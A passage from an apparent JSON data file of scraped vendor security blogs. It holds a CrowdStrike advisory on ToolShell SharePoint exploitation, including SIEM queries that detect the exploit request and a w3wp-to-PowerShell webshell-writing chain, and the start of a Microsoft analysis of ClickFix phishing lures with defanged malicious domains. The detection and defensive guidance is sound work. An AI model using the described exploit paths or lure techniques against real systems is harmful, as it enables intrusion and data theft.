dashboard releases, customers can access these predefined dashboards by navigating to Exposure management > Vulnerability management > Dashboards, then select this dashboard for ToolShell CVE-2025-53770. Figure 3. Custom Falcon Exposure Management dashboard providing visibility into CVE-2025-53770 (click to open in new tab) Falcon Exposure Management has had detections for all supported platforms since the vulnerability was initially disclosed. The vulnerability currently has an ExPRT.AI severity rating of \"Critical,\" with an exploit status of \"Actively Used (Critical)\" due to confirmed active exploitation in the wild. To identify vulnerable systems, customers can navigate to the Exposure Management > Vulnerability Management > Vulnerabilities page in the CrowdStrike Falcon platform. From there, they can use the Vulnerability ID filter with a value of \"CVE-2025-53770\" and/or \u201cCVE-2025-53771.\u201d If any of the managed systems are vulnerable, results will be shown here. If they receive the message \"No vulnerabilities found,\" then all of their managed SharePoint systems have the necessary patches. For any systems found vulnerable, the remediation guidance provided for that system will mention the necessary security updates to apply. CrowdStrike Falcon Next-Gen SIEM As the vulnerabilities discussed target the SharePoint server, ingestion of Microsoft IIS server logs provides a comprehensive view into this emerging threat. CrowdStrike Falcon\u00ae Next-Gen SIEM customers are encouraged to ingest IIS logs to gain the necessary visibility and detect malicious actions. Further information about ingesting and parsing this data source is available to customers here . The \u201cMicrosoft - IIS - Microsoft Sharepoint ToolShell Exploitation CVE-2025-53770\u201d rule template is currently available to customers who wish to detect possible exploitation attempts specific to CVE-2025-53770. This template leverages the following query to identify instances where malicious URLs are being accessed: #Vendor=\"microsoft\" #event.module=\"iis\" #event.dataset=\"iis.access\" #repo!=\"xdr*\" | parseUrl(http.request.referrer) | http.request.method=\"POST\" url.path=\"/_layouts/15/ToolPane.aspx\" url.query=\"DisplayMode=Edit&a=/ToolPane.aspx\" http.request.referrer.path=\"/_layouts/SignOut.aspx\" | http.response.status_code =~ in(values=[200,302,401]) Falcon Next-Gen SIEM users may also leverage a hunting query that uses the recently released correlate() capability. This rule , which is also provided below, may be used to identify instances where a SharePoint IIS process results in a PowerShell command being executed, followed by an ASPX file being written. correlate( cmd: { #event_simpleName=ProcessRollup2 event_platform=Win FileName=\"cmd.exe\" ParentBaseFileName=\"w3wp.exe\" } include: [aid, ComputerName, TargetProcessId, ParentBaseFileName, FileName, CommandLine], pwsh: { #event_simpleName=ProcessRollup2 event_platform=Win FileName=\"powershell.exe\" | aid <=> cmd.aid | ParentProcessId <=> cmd.TargetProcessId } include: [aid, ComputerName, TargetProcessId, ParentBaseFileName, FileName, CommandLine], aspx: { #event_simpleName=/^(NewScriptWritten|WebScriptFileWritten)$/ event_platform=Win FileName=/\\.aspx/i | aid <=> cmd.aid | ContextProcessId <=> pwsh.TargetProcessId } include: [aid, ComputerName, TargetFileName], sequence=true, within=5m) Conclusion The SharePoint vulnerability exploitation demonstrates how critical application threats can provide attackers with initial access to organizations. CrowdStrike customers benefit from multiple layers of protection against these attacks. While we strongly recommend patching SharePoint instances immediately, the Falcon platform provides comprehensive protection through: Falcon Insight XDR : Behavioral detection and prevention of exploitation attempts Falcon Exposure Management : Visibility into vulnerable SharePoint instances Falcon Next-Gen SIEM : Detection rules for Microsoft IIS logs to identify exploitation attempts CrowdStrike will continue monitoring this threat and update our guidance as new information emerges. Tweet Share Related Content CrowdStrike Named a Leader in 2025 IDC MarketScape for Worldwide Incident Response Services CrowdStrike Launches New AI Security Services to Strengthen AI Security and SOC Readiness CrowdStrike 2025 Threat Hunting Report: AI Becomes a Weapon and a Target Categories Agentic SOC 47 Cloud & Application Security 139 Data Protection 20 Endpoint Security & XDR 349 Engineering & Tech 86 Executive Viewpoint 177 Exposure Management 115 From The Front Lines 197 Next-Gen Identity Security 65 Next-Gen SIEM & Log Management 109 Public Sector 40 Securing AI 24 Threat Hunting & Intel 208 CONNECT WITH US FEATURED ARTICLES October 01, 2024 CrowdStrike Named a Leader in 2024 Gartner\u00ae Magic Quadrant\u2122 for Endpoint Protection Platforms September 25, 2024 Recognizing the Resilience of the CrowdStrike Community September 25, 2024 CrowdStrike Drives Cybersecurity Forward with New Innovations Spanning AI, Cloud, Next-Gen SIEM and Identity Protection September 18, 2024 SUBSCRIBE Sign up now to receive the latest notifications and updates from CrowdStrike. Sign Up See CrowdStrike Falcon \u00ae in Action Detect, prevent, and respond to attacks\u2014 even malware-free intrusions\u2014at any stage, with next-generation endpoint protection. See Demo Prescription for Protection: Healthcare Industry Observations from CrowdStrike Investigations CrowdStrike 2025 Threat Hunting Report: AI Becomes a Weapon and a Target Copyright \u00a9 2026 CrowdStrike Privacy Request Info Blog Contact Us 1.888.512.8906 Accessibility",
    "filtered_content": "CrowdStrike Detects and Blocks SharePoint Zero-Day Exploitation BLOG Featured CrowdStrike Named a Customers\u2019 Choice in 2026 Gartner\u00ae Peer Insights\u2122 Voice of the Customer for User Authentication Feb 12, 2026 How to Scale SOC Automation with Falcon Fusion SOAR Feb 11, 2026 Inside the Human-AI Feedback Loop Powering CrowdStrike\u2019s Agentic Security Feb 10, 2026 February 2026 Patch Tuesday: Six Zero-Days Among 59 CVEs Patched Feb 10, 2026 Recent CrowdStrike Named a Customers\u2019 Choice in 2026 Gartner\u00ae Peer Insights\u2122 Voice of the Customer for User Authentication Feb 12, 2026 How to Scale SOC Automation with Falcon Fusion SOAR Feb 11, 2026 Inside the Human-AI Feedback Loop Powering CrowdStrike\u2019s Agentic Security Feb 10, 2026 February 2026 Patch Tuesday: Six Zero-Days Among 59 CVEs Patched Feb 10, 2026 Video Video Highlights the 4 Key Steps to Successful Incident Response Dec 02, 2019 Helping Non-Security Stakeholders Understand ATT&CK in 10 Minutes or Less [VIDEO] Feb 21, 2019 Analyzing Targeted Intrusions Through the ATT&CK Framework Lens [VIDEO] Jan 22, 2019 Qatar\u2019s Commercial Bank Chooses CrowdStrike Falcon\u00ae: A Partnership Based on Trust [VIDEO] Aug 20, 2018 Category Agentic SOC Agentic SOC Inside the Human-AI Feedback Loop Powering CrowdStrike\u2019s Agentic Security 02/10/26 CrowdStrike to Acquire SGNL to Secure Every Identity in the AI Era 01/08/26 CrowdStrike\u2019s Journey in Customizing NVIDIA Nemotron Models for Peak Accuracy and Performance 01/05/26 How CrowdStrike Trains GenAI Models at Scale Using Distributed Computing 12/22/25 Cloud & Application Security Cloud & Application Security CrowdStrike Named a Customers\u2019 Choice in 2026 Gartner Peer Insights\u2122 Voice of the Customer for Application Security Posture Management Tools 02/03/26 CrowdStrike Unveils Real-Time Cloud Detection and Response Innovations 12/01/25 New User Experience Transforms Interaction with the Falcon Platform 10/21/25 How Falcon ASPM Secures GenAI Applications and Lessons from Dogfooding 09/30/25 Threat Hunting & Intel Threat Hunting & Intel LABYRINTH CHOLLIMA Evolves into Three Adversaries 01/29/26 How CrowdStrike\u2019s Malware Analysis Agent Detects Malware at Machine Speed 01/06/26 Unveiling WARP PANDA: A New Sophisticated China-Nexus Adversary 12/04/25 CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers 11/20/25 Endpoint Security & XDR Endpoint Security & XDR Advanced Web Shell Detection and Prevention: A Deep Dive into CrowdStrike's Linux Sensor Capabilities 02/05/26 CrowdStrike Falcon Scores Perfect 100% in SE Labs\u2019 Most Challenging Ransomware Test 02/03/26 CrowdStrike Named a Customers\u2019 Choice in 2026 Gartner\u00ae Voice of the Customer for Endpoint Protection Platforms 01/28/26 Small Devices, Big Risk: USB Drives Threaten Enterprise Security 01/21/26 Engineering & Tech Engineering & Tech EMBER2024: Advancing the Training of Cybersecurity ML Models Against Evasive Malware 09/03/25 Falcon Platform Prevents COOKIE SPIDER\u2019s SHAMOS Delivery on macOS 08/20/25 CrowdStrike\u2019s Approach to Better Machine Learning Evaluation Using Strategic Data Splitting 08/11/25 CrowdStrike Researchers Develop Custom XGBoost Objective to Improve ML Model Release Stability 03/20/25 Executive Viewpoint Executive Viewpoint The Architecture of Agentic Defense: Inside the Falcon Platform 01/16/26 The Dawn of the Agentic SOC: Reimagining Cybersecurity for the AI Era 09/26/25 CrowdStrike Falcon Platform Evolves to Lead the Agentic Security Era 09/16/25 CrowdStrike to Acquire Pangea to Secure Enterprise AI Use and Development 09/15/25 From The Front Lines From The Front Lines CrowdStrike Named a Leader in 2025 IDC MarketScape for Worldwide Incident Response Services 08/27/25 CrowdStrike Launches New AI Security Services to Strengthen AI Security and SOC Readiness 08/06/25 CrowdStrike Detects and Blocks Initial SharePoint Zero-Day Exploitation 07/21/25 Prescription for Protection: Healthcare Industry Observations from CrowdStrike Investigations 07/01/25 Next-Gen Identity Security Next-Gen Identity Security CrowdStrike Named a Customers\u2019 Choice in 2026 Gartner\u00ae Peer Insights\u2122 Voice of the Customer for User Authentication 02/12/26 CrowdStrike to Acquire Seraphic to Secure Work in Any Browser 01/13/26 Falcon Shield Evolves with AI Agent Visibility and Falcon Next-Gen SIEM Integration 12/08/25 CrowdStrike Named Overall Leader in 2025 KuppingerCole ITDR Leadership Compass 11/10/25 Next-Gen SIEM & Log Management Next-Gen SIEM & Log Management How to Scale SOC Automation with Falcon Fusion SOAR 02/11/26 Transform AWS Security Operations with Falcon Next-Gen SIEM 12/01/25 CrowdStrike Leads New Evolution of Security Automation with Charlotte Agentic SOAR 11/05/25 CrowdStrike Named a Visionary in 2025 Gartner\u00ae Magic Quadrant\u2122 for Security Information and Event Management 10/10/25 Public Sector Public Sector CrowdStrike Achieves FedRAMP\u00ae High Authorization 03/19/25 NHS Matures Healthcare Cybersecurity with NCSC\u2019s CAF Assurance Model 03/13/25 Zero Trust Strengthens Data Protection to Achieve National Cyber Strategy Goals 01/15/25 CrowdStrike Statement on Bloomberg\u2019s October 25, 2024 Story 10/25/24 Exposure Management Exposure Management February 2026 Patch Tuesday: Six Zero-Days Among 59 CVEs Patched 02/10/26 CrowdStrike Is the Only Vendor to Be Named a Customers\u2019 Choice in 2025 Gartner\u00ae Voice of the Customer for External Attack Surface Management 02/09/26 January 2026 Patch Tuesday: 114 CVEs Patched Including 3 Zero-Days 01/13/26 Inside the Latest Innovations Powering Falcon Exposure Management 12/12/25 Data Protection Data Protection Falcon Data Protection for Cloud Extends DSPM into Runtime 11/20/25 CrowdStrike Stops GenAI Data Leaks with Unified Data Protection 09/18/25 Q&A: How Mastronardi Produce Secures Innovation with CrowdStrike 02/14/25 Data Protection Day 2025: The Evolving Role of AI in Data Protection 01/28/25 Securing AI Securing AI What Security Teams Need to Know About OpenClaw, the AI Super Agent 02/04/26 Secure AI with CrowdStrike: Real-World Stories of Protecting AI Workloads and Data 02/02/26 How Agentic Tool Chain Attacks Threaten AI Agent Security 01/30/26 Data Protection Day 2026: From Compliance to Resilience 01/28/26 Start Free Trial Featured Recent Video Category Start Free Trial CrowdStrike Detects and Blocks Initial SharePoint Zero-Day Exploitation Learn more about this emerging threat and how CrowdStrike customers can use the Falcon platform to protect their environments. July 21, 2025 | CrowdStrike Engineering | From The Front Lines Beginning on July 18, 2025, at approximately 0700 UTC, CrowdStrike Falcon\u00ae Complete Next-Gen MDR and CrowdStrike Falcon\u00ae Adversary OverWatch\u2122 identified a wave of Microsoft SharePoint exploitation attempts by an unknown adversary. Two distinct zero-day vulnerabilities were made publicly available: a critical remote code execution vulnerability ( CVE-2025-53770 ) and a server spoofing vulnerability ( CVE-2025-53771 ). The chaining of these vulnerabilities to exploit a vulnerable SharePoint server is being referred to as \u201cToolShell.\u201d Since the start of this exploitation, CrowdStrike has observed and successfully blocked hundreds of exploitation attempts across 160+ customer environments, demonstrating both the scale of this threat and the effectiveness of our protection capabilities. The CrowdStrike Falcon\u00ae platform detects and protects against exploitation of the Microsoft SharePoint zero-days, blocking known behaviors associated with these vulnerabilities. This blog post provides context surrounding this emerging threat, as well as guidance for customers on how they can use the Falcon platform to protect their environments. Customers of CrowdStrike Falcon\u00ae Adversary Intelligence Premium can find more detailed analysis in Intel report CSA-250846. Observed Exploitation of SharePoint Vulnerability CrowdStrike has observed widespread exploitation of CVE-2025-53770 involving a deserialisation attack leading to attempts to write a malicious .aspx webshell on the host. That file, spinstall0.aspx , is used to steal IIS Machine Keys, which can later be used for other post-exploitation attacks. This attack begins with a specially crafted POST request to an accessible SharePoint server. The POST request payload will attempt to write the .aspx file via PowerShell. That malicious PowerShell command, spawned from the SharePoint IIS process, is blocked by the Falcon platform. Figure 1. Blocked PowerShell spawned from the SharePoint worker process w3wp.exe (click to open in new tab) We have tracked the size and speed of attempted payload delivery over time by mapping detections from the Falcon platform. The following timeline of activity has been observed: July 18 (morning UTC): A small number of SharePoint servers were attacked July 18 (1330-1845 UTC): Shortly after, likely following the publicity of the zero-day, the campaign ramped up significantly with 177 servers attacked on the same day July 19 (0600-0800 UTC): Exploitation recommenced briefly before temporarily ceasing July 21 (0740 UTC): Activity resumes with 32 servers attacked in four hours up to 1130 UTC Figure 2. Observed instances of attempted exploitation of SharePoint servers over time (click to open in new tab) Defending Against This Threat Organizations are strongly encouraged to apply patches that have been released to ensure they are protected. Microsoft has published customer guidance and released patches for Microsoft SharePoint Server 2019 Core , Microsoft SharePoint Server Subscription Edition , and Microsoft SharePoint Enterprise Server 2016 . CrowdStrike Falcon Endpoint Detection and Response As mentioned in our opening analysis, this attack relies on specially crafted POST requests to exploit the SharePoint zero-day vulnerabilities. CrowdStrike Falcon\u00ae Insight XDR endpoint security successfully detected and blocked these attacks through advanced behavioral analysis rather than relying on signature-based detections. The attack chain exploits SharePoint servers by executing malicious code to extract authentication keys, enabling attackers to send authenticated system-level commands. Falcon Insight XDR\u2019s behavioral engine identified suspicious activity when SharePoint processes began launching command prompts and PowerShell scripts \u2014 a clear deviation from normal SharePoint operations. Our multi-layered approach detected: Abnormal process behavior : Suspicious process chains originating from SharePoint services, including webshells and reconnaissance Network anomalies : Questionable DNS requests that generated alerts in the Falcon console Behavioral correlation : Multiple indicators confirming malicious intent Threat actors continuously adapt their techniques based on security vendor responses. CrowdStrike's threat research team proactively enhances our detection capabilities in response. We are deploying additional behavioral detections this week that focus on post-exploitation activities and alternative attack vectors, providing continued coverage as attack methods evolve. CrowdStrike Falcon Exposure Management Customers can find CVE-2025-53770 and CVE-2025-53771 with CrowdStrike Falcon\u00ae Exposure Management\u2019s vulnerability management capability. CrowdStrike has developed a custom dashboard for Falcon Exposure Management customers so they can quickly see which hosts are vulnerable. The dashboard includes threat analysis provided by researchers, detailed information on vulnerable hosts, and the count of vulnerable product versions. As with other custom dashboard releases, customers can access these predefined dashboards by navigating to Exposure management > Vulnerability management > Dashboards, then select this dashboard for ToolShell CVE-2025-53770. Figure 3. Custom Falcon Exposure Management dashboard providing visibility into CVE-2025-53770 (click to open in new tab) Falcon Exposure Management has had detections for all supported platforms since the vulnerability was initially disclosed. The vulnerability currently has an ExPRT.AI severity rating of \"Critical,\" with an exploit status of \"Actively Used (Critical)\" due to confirmed active exploitation in the wild. To identify vulnerable systems, customers can navigate to the Exposure Management > Vulnerability Management > Vulnerabilities page in the CrowdStrike Falcon platform. From there, they can use the Vulnerability ID filter with a value of \"CVE-2025-53770\" and/or \u201cCVE-2025-53771.\u201d If any of the managed systems are vulnerable, results will be shown here. If they receive the message \"No vulnerabilities found,\" then all of their managed SharePoint systems have the necessary patches. For any systems found vulnerable, the remediation guidance provided for that system will mention the necessary security updates to apply. CrowdStrike Falcon Next-Gen SIEM As the vulnerabilities discussed target the SharePoint server, ingestion of Microsoft IIS server logs provides a comprehensive view into this emerging threat. CrowdStrike Falcon\u00ae Next-Gen SIEM customers are encouraged to ingest IIS logs to gain the necessary visibility and detect malicious actions. Further information about ingesting and parsing this data source is available to customers here . The \u201cMicrosoft - IIS - Microsoft Sharepoint ToolShell Exploitation CVE-2025-53770\u201d rule template is currently available to customers who wish to detect possible exploitation attempts specific to CVE-2025-53770. This template leverages the following query to identify instances where malicious URLs are being accessed: #Vendor=\"microsoft\" #event.module=\"iis\" #event.dataset=\"iis.access\" #repo!=\"xdr*\" | parseUrl(http.request.referrer) | http.request.method=\"POST\" url.path=\"/_layouts/15/ToolPane.aspx\" url.query=\"DisplayMode=Edit&a=/ToolPane.aspx\" http.request.referrer.path=\"/_layouts/SignOut.aspx\" | http.response.status_code =~ in(values=[200,302,401]) Falcon Next-Gen SIEM users may also leverage a hunting query that uses the recently released correlate() capability. This rule , which is also provided below, may be used to identify instances where a SharePoint IIS process results in a PowerShell command being executed, followed by an ASPX file being written. correlate( cmd: { #event_simpleName=ProcessRollup2 event_platform=Win FileName=\"cmd.exe\" ParentBaseFileName=\"w3wp.exe\" } include: [aid, ComputerName, TargetProcessId, ParentBaseFileName, FileName, CommandLine], pwsh: { #event_simpleName=ProcessRollup2 event_platform=Win FileName=\"powershell.exe\" | aid <=> cmd.aid | ParentProcessId <=> cmd.TargetProcessId } include: [aid, ComputerName, TargetProcessId, ParentBaseFileName, FileName, CommandLine], aspx: { #event_simpleName=/^(NewScriptWritten|WebScriptFileWritten)$/ event_platform=Win FileName=/\\.aspx/i | aid <=> cmd.aid | ContextProcessId <=> pwsh.TargetProcessId } include: [aid, ComputerName, TargetFileName], sequence=true, within=5m) Conclusion The SharePoint vulnerability exploitation demonstrates how critical application threats can provide attackers with initial access to organizations. CrowdStrike customers benefit from multiple layers of protection against these attacks. While we strongly recommend patching SharePoint instances immediately, the Falcon platform provides comprehensive protection through: Falcon Insight XDR : Behavioral detection and prevention of exploitation attempts Falcon Exposure Management : Visibility into vulnerable SharePoint instances Falcon Next-Gen SIEM : Detection rules for Microsoft IIS logs to identify exploitation attempts CrowdStrike will continue monitoring this threat and update our guidance as new information emerges. Tweet Share Related Content CrowdStrike Named a Leader in 2025 IDC MarketScape for Worldwide Incident Response Services CrowdStrike Launches New AI Security Services to Strengthen AI Security and SOC Readiness CrowdStrike 2025 Threat Hunting Report: AI Becomes a Weapon and a Target Categories Agentic SOC 47 Cloud & Application Security 139 Data Protection 20 Endpoint Security & XDR 349 Engineering & Tech 86 Executive Viewpoint 177 Exposure Management 115 From The Front Lines 197 Next-Gen Identity Security 65 Next-Gen SIEM & Log Management 109 Public Sector 40 Securing AI 24 Threat Hunting & Intel 208 CONNECT WITH US FEATURED ARTICLES October 01, 2024 CrowdStrike Named a Leader in 2024 Gartner\u00ae Magic Quadrant\u2122 for Endpoint Protection Platforms September 25, 2024 Recognizing the Resilience of the CrowdStrike Community September 25, 2024 CrowdStrike Drives Cybersecurity Forward with New Innovations Spanning AI, Cloud, Next-Gen SIEM and Identity Protection September 18, 2024 SUBSCRIBE Sign up now to receive the latest notifications and updates from CrowdStrike. Sign Up See CrowdStrike Falcon \u00ae in Action Detect, prevent, and respond to attacks\u2014 even malware-free intrusions\u2014at any stage, with next-generation endpoint protection. See Demo Prescription for Protection: Healthcare Industry Observations from CrowdStrike Investigations CrowdStrike 2025 Threat Hunting Report: AI Becomes a Weapon and a Target Copyright \u00a9 2026 CrowdStrike Privacy Request Info Blog Contact Us 1.888.512.8906 Accessibility",
    "expected_count": 1
  },
  {
    "url": "https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/",
    "title": "Your Privacy Choices Opt-Out Icon",
    "content": "Skip to content Skip to main content Microsoft Microsoft Security Microsoft Security Microsoft Security Home Why Microsoft Security Solutions AI-powered cybersecurity Cloud security Data security & governance Identity & network access Privacy & risk management Security for AI Unified SecOps Zero Trust Products Product families Product families Microsoft Defender Microsoft Entra Microsoft Intune Microsoft Priva Microsoft Purview Microsoft Sentinel Security AI Security AI Microsoft Security Copilot Identity & access Identity & access Microsoft Entra ID (Azure Active Directory) Microsoft Entra Agent ID Microsoft Entra External ID Microsoft Entra ID Governance Microsoft Entra ID Protection Microsoft Entra Internet Access Microsoft Entra Private Access Microsoft Entra Permissions Management Microsoft Entra Verified ID Microsoft Entra Workload ID Microsoft Entra Domain Services Azure Key Vault SIEM & XDR SIEM & XDR Microsoft Sentinel Microsoft Defender for Cloud Microsoft Defender XDR Microsoft Defender for Endpoint Microsoft Defender for Office 365 Microsoft Defender for Identity Microsoft Defender for Cloud Apps Microsoft Security Exposure Management Microsoft Defender Vulnerability Management Microsoft Defender Threat Intelligence Cloud security Cloud security Microsoft Defender for Cloud Microsoft Defender Cloud Security Posture Mgmt Microsoft Defender External Attack Surface Management Azure Firewall Azure Web App Firewall Azure DDoS Protection GitHub Advanced Security Endpoint security & management Endpoint security & management Microsoft Defender for Endpoint Microsoft Defender XDR Microsoft Defender for Business Microsoft Intune core capabilities Microsoft Defender for IoT Microsoft Defender Vulnerability Management Microsoft Intune Advanced Analytics Microsoft Intune Endpoint Privilege Management\u200b Microsoft Intune Enterprise Application Management Microsoft Intune Remote Help Microsoft Cloud PKI Compliance & privacy Compliance & privacy Microsoft Purview Communication Compliance Microsoft Purview Compliance Manager Microsoft Purview Data Lifecycle Management Microsoft Purview eDiscovery Microsoft Purview Audit Microsoft Priva Risk Management Microsoft Priva Subject Rights Requests Data security & governance Data security & governance Microsoft Purview Information Protection Microsoft Purview Insider Risk Management Microsoft Purview Data Loss Prevention Microsoft Purview Data Governance Pricing Services Partners Resources Get started Get started Cybersecurity awareness Customer stories Security 101 Product trials How we protect Microsoft Reports and analysis Reports and analysis Industry recognition Microsoft Security Insider Microsoft Digital Defense Report Security Response Center Community Community Microsoft Security Blog Microsoft Security Events Microsoft Tech Community Documentation and training Documentation and training Documentation Technical Content Library Training & certifications Additional sites Additional sites Compliance Program for Microsoft Cloud Microsoft Trust Center Security Engineering Portal Service Trust Portal Microsoft Secure Future Initiative Business Solutions Hub Contact Sales Start free trial More All Microsoft Global Microsoft Security Azure Dynamics 365 Microsoft 365 Microsoft Teams Windows 365 Tech & innovation Tech & innovation Microsoft AI Azure Space Mixed reality Microsoft HoloLens Microsoft Viva Quantum computing Sustainability Industries Industries Education Automotive Financial services Government Healthcare Manufacturing Retail Partners Partners Find a partner Become a partner Partner Network Microsoft Marketplace Marketplace Rewards Software development companies Resources Resources Blog Microsoft Advertising Developer Center Documentation Events Licensing Microsoft Learn Microsoft Research View Sitemap Search Search Microsoft Security No results Cancel Home Think before you Click(Fix): Analyzing the ClickFix social engineering technique Search Research August 21, 2025 26 min read Think before you Click(Fix): Analyzing the ClickFix social engineering technique By Microsoft Threat Intelligence and Microsoft Defender Experts Share Link copied to clipboard! Content types Research Products and services Microsoft Defender Microsoft Defender Experts for XDR Microsoft Defender for Endpoint Microsoft Defender for Office 365 Microsoft Security Experts Topics Threat intelligence Over the past year, Microsoft Threat Intelligence and Microsoft Defender Experts have observed the ClickFix social engineering technique growing in popularity, with campaigns targeting thousands of enterprise and end-user devices globally every day. Since early 2024, we\u2019ve helped multiple customers across various industries address such campaigns attempting to deliver payloads like the prolific Lumma Stealer malware. These payloads affect Windows and macOS devices and typically lead to information theft and data exfiltration. The ClickFix technique attempts to trick users into running malicious commands on their devices by taking advantage of their target\u2019s tendency to solve minor technical issues and other seemingly benign interactions, such as human verification and CAPTCHA checks. It typically gives the users instructions that involve clicking prompts and copying, pasting, and running commands directly in the Windows Run dialog box, Windows Terminal, or Windows PowerShell. It\u2019s often combined with delivery vectors such as phishing, malvertising, and drive-by compromises, most of which even impersonate legitimate brands and organizations to further reduce suspicion from their targets. Because ClickFix relies on human intervention to launch the malicious commands, a campaign that uses this technique could get past conventional and automated security solutions. Organizations could thus reduce the impact of this technique by educating users in recognizing its lures and by implementing policies that will harden the device configurations in their environment (for example, disallowing users to use the Run dialog if it\u2019s not necessary in their daily tasks). Microsoft Defender XDR also provides a comprehensive set of protection features that detect this threat at various stages of the attack chain. This blog discusses the different elements that make up a ClickFix campaign\u2014from the arrival vectors it comes with to its various implementations\u2014and provides different examples of threat campaigns we\u2019ve observed to further illustrate these elements. We also provide recommendations and detection details to surface and mitigate this threat. The ClickFix attack chain Before the click: Arrival vectors Inside the click: ClickFix implementations The \u201cfix\u201d: User-level code execution Beyond Windows: ClickFix targeting macOS users Behind the click: ClickFix kits and other services for sale ClickFix protection and detection The ClickFix attack chain A typical ClickFix attack begins with threat actors using phishing emails, malvertisements, or compromised websites to lead unsuspecting users to a visual lure\u2014usually a landing page\u2014and trick them into executing a malicious command themselves. By adding this user interaction element in the attack chain, a threat using the ClickFix technique could slip through conventional and automated security solutions. Microsoft Threat Intelligence observed threat actors adapting and improving certain elements of the technique to further evade detection. For example, threat actors obfuscate the JavaScript that generates the visual lures or they download parts of the code from different servers. They also employ various tactics in obfuscating malicious commands. We discuss these stages of the attack chain in detail in the succeeding sections of this blog. Once the malicious command is run by the user, malware is downloaded into the target device. We\u2019ve observed numerous threat actors that leverage ClickFix attacks deliver the following: Infostealers like LummaStealer , which appears to be the most prolific ClickFix final payload based on our observations and threat hunting investigations Remote access tools (RATs) such as Xworm, AsyncRAT, NetSupport, and SectopRAT, which could allow threat actors to conduct hands-on keyboard activity like discovery, lateral movement, and persistence Loaders like Latrodectus and MintsLoader, which could deliver additional malware and other payloads Rootkits, such as a modified version of the open source r77, which could allow threat actors to employ several sophisticated persistence and defense evasion tactics and remain deeply embedded in a victim system These final payloads are often \u201cfileless\u201d, that is, they\u2019re seldom written to disk as a Windows executable ( .exe or .dll ) file. Instead, they\u2019re loaded and launched in memory by living-off-the-land binaries (LOLBins), often as a .NET assembly or Common Language Runtime (CLR) module. However, whether the malware is on disk or in memory, we\u2019ve observed its code injected into LOLBins, such as msbuild.exe , regasm.exe , or powershell.exe . Figure 1. The typical ClickFix attack chain Case study: Lampion malware campaign To illustrate a typical ClickFix attack chain, let\u2019s look at a campaign we first identified in May 2025 targeting Portuguese organizations in government, finance, and transportation sectors to deliver Lampion malware, an infostealer focused on banking information. This campaign has since been observed in other countries\u2014including Portugal, Switzerland, Luxembourg, France, Hungary, and Mexico\u2014targeting organizations in the government, education, transportation, and financial services industries. As of June 2025, this campaign remains active. The Lampion malware campaign\u2019s ClickFix lures, obfuscation methods, and multi-stage infection process are designed to evade detection: The threat actor sends phishing emails containing a ZIP file, which when opened, contains an HTML file that redirects target users to a fake Portuguese tax authority site where the ClickFix lure is hosted. The ClickFix lure tricks users into launching a PowerShell command that downloads an obfuscated VBScript ( .vbs ). The downloaded script then writes a second obfuscated .vbs file to the Windows %TEMP% directory and schedules it to run later using a hidden task. This second .vbs file downloads a third and much larger .vbs file that performs reconnaissance, checks for antivirus or sandbox environments, and sends system data to a command-and-control (C2) server. The third script also creates a .cmd file in the Windows startup folder, naming it after the user\u2019s hostname, and schedules a system restart. After the device restarts, the .cmd file launches a large DLL through rundll32.exe and attempts to deliver the final payload. However, during our investigation, the actual Lampion malware wasn\u2019t delivered because the download command was commented out of the code. Figure 2. Lampion infection chain Before the click: Arrival vectors Threat actors leveraging ClickFix rely on a variety of methods to lure unwitting users. We\u2019ve observed three primary avenues where a user could encounter a ClickFix prompt: by receiving phishing emails, encountering a malicious ad, or by visiting a compromised or malicious website. Phishing Microsoft Threat Intelligence first observed the use of the ClickFix technique between March and June 2024 in email campaigns sent by a threat actor we track as Storm-1607. These emails contained HTML attachments that attempted to install DarkGate, a commodity loader that is capable of keylogging, cryptocurrency mining, establishing C2 communications, and downloading additional malicious payloads, among others. One of Storm-1607\u2019s campaigns observed in May 2024 consisted of tens of thousands of emails targeting organizations in the United States (US) and Canada. These emails used payment and invoice lures and contained attachments with file names like reports_528647.html : Figure 3. Storm-1607 phishing email When opened, the HTML loaded a page with a fake Microsoft Word new document image and a dialog box showing an error message and prompting the user to click the How to fix button: Figure 4. HTML attachment displaying a Microsoft Word background and ClickFix lure Clicking the button copied the malicious code on the user\u2019s clipboard in the background. Meanwhile, the dialog box added new instructions that explained to the user how to open Windows Terminal and paste the malicious code into it: Figure 5. ClickFix lure displaying further instructions While other threat actors also use invoice or payment lures in their phishing campaigns, as of this writing, including HTML attachments in the emails is no longer the preferred method to implement the ClickFix technique. Instead, threat actors now include in their phishing email a URL that points to a ClickFix landing page. For example, in March 2025, we observed a threat actor tracked as Storm-0426 launch a campaign consisting of thousands of phishing emails that targeted users in Germany and attempted to install MintsLoader. The emails used payment and invoice lures purportedly from a web hosting provider and contained URLs leading to the Prometheus traffic direction system (TDS) hosted on numerous compromised sites: Figure 6. Storm-0426 phishing email The TDS redirected users to the attacker-controlled website mein-lonos-cloude[.]de , where the ClickFix technique instructed the users to complete a human verification process by following the displayed instructions, which launched a malicious code: Figure 7. ClickFix landing page Another example of a phishing campaign using URLs and redirectors was observed in June 2025, where the campaign impersonated the US Social Security Administration (SSA) and used a combination of social engineering and domain spoofing to deliver ScreenConnect, a legitimate remote management tool that has become increasingly abused by threat actors. Once installed, ScreenConnect could give an attacker full remote control over a victim\u2019s system, enabling them to exfiltrate data, install additional malware, or conduct surveillance. The campaign began with emails sent from a legitimate but compromised Brazilian domain. The message, which even included legitimate links to SSA\u2019s official social media accounts in the footer, claimed that there was an issue with the recipient\u2019s social security statement. Like other phishing emails, these characteristics and tactics were all attempts by the threat actor to bypass spam filters, lend credibility and reduce suspicion to the message, and prompt the user to take immediate action: Figure 8. Phishing email impersonating the US SSA The message\u2019s call-to-action button, labeled Download Statement , was also particularly deceptive because instead of linking directly to a malicious site, it used a Google Ads URL redirect to obfuscate the final destination. This technique not only helped the email pass through conventional email security solutions, it also undermined an email best practice (hovering over the links before clicking to determine if the URL displayed points to the intended site or not) users are typically taught as part of their security awareness trainings. When a user clicked the Download Statement button, they were redirected to a spoofed SSA website hosted on a Spanish top-level domain ( access-ssa-gov[.]es ). The site closely mimicked the real SSA home page, including a blurred background image of the legitimate site to create a false sense of familiarity and trust: Figure 9. ClickFix landing page impersonating the US SSA The landing page presented the user with a CAPTCHA human verification pop-up, which was part of the ClickFix technique. Behind the scenes, this interaction triggered a series of fake verification steps designed to guide the user into running a PowerShell script that would eventually download and launch the ScreenConnect payload: Figure 10. ClickFix instructions from the spoofed US SSA domain Malvertising Malvertising is another popular delivery method that leads to ClickFix landing pages. In a campaign observed in April 2025, users who attempted to stream free or pirated 